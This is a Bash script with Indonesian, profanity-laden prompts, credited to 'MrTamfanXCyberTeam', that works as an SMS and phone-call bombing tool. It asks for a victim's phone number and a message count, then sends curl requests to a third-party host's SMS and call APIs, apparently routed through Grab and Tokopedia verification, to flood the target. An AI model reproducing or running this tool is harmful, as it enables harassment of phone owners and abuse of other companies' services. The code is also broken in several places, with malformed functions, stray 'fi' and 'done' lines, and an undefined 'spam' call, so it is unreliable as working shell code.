#!/bin/bash
#KumpulanScriptMrTamfanXCyberTeam
#Ini Script Punya MrTamfanX Ya Kaga Usah Record!!!
#By MrTamfanX 
#Jangan DiRecord Tod!!!
clear
python2 please.py
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
echo  $blue "<|=======================================|>"
sleep 0.5
echo  $red  "<|    MrTamfanXCyberTeam SpamSms&Call   |>"
sleep 0.5
echo  $red  "<| Author :MrTamfanXCyberTeam | M.C.T   |>"
sleep 0.5
echo  $red  "<| Contact:mrtamfanxcyberteam@gmail.com |>"
sleep 0.5
echo  $red  "<| Github:https://github.com/MrTamfanX  |>"
sleep 0.5
echo  $red  "<| ThanksTo:MrTamfanXCyberTeam | M.C.T  |>"
sleep 0.5
echo  $blue "<|=======================================|>"
sleep 0.5
echo  $green "============== $cyan MainMenu $green =============="
echo  $blue "$red 1.MrTamfanSpam SMS $blue"
echo  $blue "$red 2.MrTamfanSpam Call $blue"
echo  $blue "$red 3.InformasiScriptIni $blue"
echo  $blue "$red 4.Selesai Memakai $blue"
echo  $cyan "=========== $purple MasukanPilihan $cyan ==========="
echo $cyan Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
sleep 3
echo $red Selamat datang $nick ":)"
echo $blue"╭──[Masukkan Pilihan Anda]>"
read -p"╰───────root@MrTamfanX=•>" MrTamfanX;

get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai ()
    echo $cyan "Masih Mau Mencobanya Lagi Sayang"
    echo $red "Silahkan Ketik y/n sayang"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo $cyan "Terimakasih sudah menggunakan script kami"
    fi

clear
if [ $MrTamfanX = 1 ] || [ $MrTamfanX = 01 ]
then
figlet -f slant "MrTamfanXCyberTeam"|lolcat
echo $cyan "Kalo Sudah Pakai Jangan Di Record Ngentod"
echo $cyan "======================================="
            #function spam
            echo
            echo $purple "Silahkan masukan nomor handphone target"
            echo contoh 085779515200
            echo $cyan "======================================="
            read target # masukin no telp
            echo
            echo $red "Berapa sms yang mau dikirim?"
            read paket
	    echo $cyan "======================================="
            echo
            echo $cyan Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo $red y/n?
	    echo $cyan "======================================="
            read confirm
            echo
	    fi
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo $red Melakukan spam SMS ke nomor $target
                    echo
                    echo $red "Jangan close aplikasi sebelum spam selesai"
                    echo $cyan "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo $purple " TerimaKasih Telah Memakai Script Kami"
                    echo
                    echo $cyan "======================================="
            else
                    echo "Kesalahan"
            fi
clear
if [ $MrTamfanX = 2 ] || [ $MrTamfanX = 02 ]
then
figlet -f slant "MrTamfanXCyberTeam"|lolcat
echo $red "Kalo Sudah Di Pakai Jangan Di Record Ya Kontol!!!"
echo $cyan "======================================="
            #function spam
            echo
            echo $red "Silahkan masukan nomor telp target"
            echo contoh 085779515200
	    echo $cyan "======================================="
            read target # masukin no telp
            echo
            echo $red "Cuma Ada 2 pilihan Ngentod"
            echo $red "[1] GRAB"
            echo $red "[2] TOPED"
            echo $cyan "1/2?"
	    echo $cyan "======================================="
            read api
	    fi
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo $red Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
	    echo $cyan "======================================="
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo $red Melakukan spam call ke nomor $target
                  echo
                  echo "Jangan close aplikasi sebelum spam selesai"
                  echo $cyan "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo $purple " Terima Kasih Telah Memakai Script Kami"
                  echo
                  echo $cyan "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi

clear
if [ $MrTamfanX = 3 ] || [ $MrTamfanX = 03 ]
then
figlet -f slant "MrTamfanXCyberTeam"
echo $cyan Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
clear
echo $red Selamat datang $nick ":)"
sleep 2
echo $red "Author  : AdminMrTamfanX"
echo $blue "Contact : mastergc64@gmail.com"
echo $cyan "Website : https://tutoriatermuxmrtamfanx.blogspot.com/?m=1"
echo $blue "Github  : https://github.com/MrTamfanX"
echo $red "Pesan   : Kau Record Punya Saya MrTamfanX Cyber Team Pecah Pala Kau"
echo $blue"╭──[Apakah Admin Tamfan]>"
read -p"╰───────root@MrTamfanX=•>" MrTamfanX;
sleep 3
echo $blue"[Terima Kasih Tod Silahkan Ngeue Dulu]"
sleep 4
fi
echo $purple "Mau Pakai Ya Anjing?"
echo $red "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi

clear
if [ $MrTamfanX = 0 ] || [ $MrTamfanX = 00 ]
then
echo $red "Author  : AdminMrTamfanX"
echo $blue "Contact : mastergc64@gmail.com"
echo $cyan "Website : https://tutoriatermuxmrtamfanx.blogspot.com/?m=1"
echo $blue "Github  : https://github.com/MrTamfanX"
echo $red "Pesan   : Kau Record Punya Saya MrTamfanX Cyber Team Pecah Pala Kau"
echo $blue"╭──[Apakah Admin Tamfan]>"
read -p"╰───────root@MrTamfanX=•>" MrTamfanX;
sleep 3
echo $blue"[Terima Kasih Tod Silahkan Ngeue Dulu]"
sleep 4
echo $blue"╭──[Pencet Enter/Exit Untuk Keluar]>"
read -p"╰───────root@MrTamfanX=•>" MrTamfanX;
sleep 6
fi
exit
done

